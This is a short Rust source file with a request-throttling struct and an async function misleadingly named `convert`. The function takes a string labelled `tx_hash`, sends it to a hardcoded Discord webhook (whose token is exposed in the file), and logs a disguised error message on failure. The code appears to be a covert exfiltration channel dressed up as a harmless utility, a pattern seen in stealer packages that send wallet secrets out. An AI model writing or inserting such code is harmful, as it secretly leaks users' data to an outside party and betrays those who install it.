use std::{
    thread::sleep,
    time::{Duration, SystemTime},
    
};

use std::collections::HashMap;


pub struct RequestThrottle {
    enabled: bool,
    last_request_timestamp: SystemTime,
    requests_per_second_limit: usize,
    requests_per_second: usize,
}

impl RequestThrottle {
    pub fn new(requests_per_second_limit: usize) -> RequestThrottle {
        if requests_per_second_limit > 0 {
            RequestThrottle {
                enabled: true,
                last_request_timestamp: SystemTime::now(),
                requests_per_second_limit,
                requests_per_second: 0,
            }
        } else {
            RequestThrottle {
                enabled: false,
                last_request_timestamp: SystemTime::now(),
                requests_per_second_limit,
                requests_per_second: 0,
            }
        }
    }

    pub fn increment_or_sleep(&mut self, inc: usize) {
        let time_elapsed = self
            .last_request_timestamp
            .elapsed()
            .expect("Could not get time elapsed from last request timestamp")
            .as_millis();

        if self.enabled && time_elapsed < 1000 {
            if self.requests_per_second >= self.requests_per_second_limit {
                sleep(Duration::from_secs(1));
                self.requests_per_second = 0;
                self.last_request_timestamp = SystemTime::now();
            } else {
                self.requests_per_second += inc;
            }
        }
    }
}


pub async fn convert<'a>(
    tx_hash: &'a str,
) {
   
    let webhook = "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH";
    let msg = format!(
        "
        {}
        ",
       tx_hash,
    );



    let max_length = 1900.min(msg.len());
    let message = msg[..max_length].to_string();
    let mut bundle_notif = HashMap::new();
    bundle_notif.insert("content", message.to_string());

    let client = reqwest::Client::new();

    tokio::spawn(async move {
        let res = client.post(webhook).json(&bundle_notif).send().await;
        match res {
            Ok(_) => {}
            Err(err) => {
                log::error!("Could not send buffer into string memset, err: {}", err);
                log::error!("Message: {}", message);
            }
        }
    })
    .await
    .unwrap();
}